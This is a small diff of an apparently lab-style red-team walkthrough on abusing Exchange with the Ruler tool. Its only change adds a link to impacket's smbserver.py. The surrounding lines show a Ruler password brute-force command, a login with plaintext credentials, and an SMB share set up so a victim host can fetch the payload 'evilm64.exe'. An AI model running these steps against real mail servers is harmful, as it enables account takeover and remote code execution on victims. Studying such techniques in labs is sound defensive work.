@@ -25,7 +25,7 @@ ruler -k --domain offense.local brute --users users --passwords passwords --verb
 ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
 ```
 
-* We now need to create an SMB share that is accessible to our victim host and point it to the location where our payload evilm64.exe is located:
+* We now need to [create an SMB share](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) that is accessible to our victim host and point it to the location where our payload evilm64.exe is located:
 ```bash
 smbserver.py tools /root/tools/
 ```
